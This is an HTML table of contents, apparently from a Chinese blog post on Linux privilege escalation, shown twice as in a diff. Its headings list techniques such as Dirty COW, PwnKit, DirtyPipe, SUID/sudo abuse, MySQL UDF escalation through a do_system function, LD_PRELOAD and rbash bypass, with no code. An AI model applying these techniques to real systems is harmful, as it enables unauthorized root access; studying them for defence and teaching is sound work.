href="#Web-%E7%94%A8%E6%88%B7-UDF%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.6.</span> <span class="toc-text">Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Capability%E8%83%BD%E5%8A%9B-%E7%90%86%E8%A7%A3%E4%B8%BASUID%E5%8D%87%E7%BA%A7%E7%89%88"><span class="toc-number">1.3.7.</span> <span class="toc-text">Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-LD-Preload%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.3.8.</span> <span class="toc-text">普通用户-LD_Preload加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-Rbash%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">普通用户-Rbash绕过</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux"><span class="toc-number">1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%AD%9B%E9%80%89%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">内核漏洞筛选：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-linux%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">web-linux应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见内核漏洞案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Dcow"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Web&amp;内核溢出-Dcow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-Pwnkit"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Web&amp;内核溢出-Pwnkit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA-DirtyPipe"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">Web&amp;内核溢出-DirtyPipe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-NFS%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">Web&amp;用户-NFS安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Cron%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">Web&amp;用户-Cron任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-Web-%E7%94%A8%E6%88%B7-PATH%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">Linux系统提权-Web&amp;用户-PATH变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-SUDO%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">SUID&amp;SUDO应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Suid"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">Web&amp;用户-Suid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Sudo-cve-%E7%94%A8%E6%88%B7%E6%98%AF%E5%9B%A0%E4%B8%BAgit%E8%BF%99%E7%A7%8D%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%94%AF%E6%8C%81"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-UDF%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.6.</span> <span class="toc-text">Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAxiaodi%E8%A1%A8"><span class="toc-number">2.</span> <span class="toc-text">创建xiaodi表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%80xiaodi%E8%A1%A8%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84udf-so"><span class="toc-number">3.</span> <span class="toc-text">往xiaodi表中插入二进制的udf.so</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAudf-so"><span class="toc-number">4.</span> <span class="toc-text">导出udf.so</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAdo-system%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">创建do_system自定义函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%94%A8%E6%88%B7-Capability%E8%83%BD%E5%8A%9B-%E7%90%86%E8%A7%A3%E4%B8%BASUID%E5%8D%87%E7%BA%A7%E7%89%88"><span class="toc-number">5.0.1.</span> <span class="toc-text">Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-LD-Preload%E5%8A%A0%E8%BD%BD"><span class="toc-number">5.0.2.</span> <span class="toc-text">普通用户-LD_Preload加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-Rbash%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">普通用户-Rbash绕过</span></a></li></ol></li></ol>
       </div>
     
 
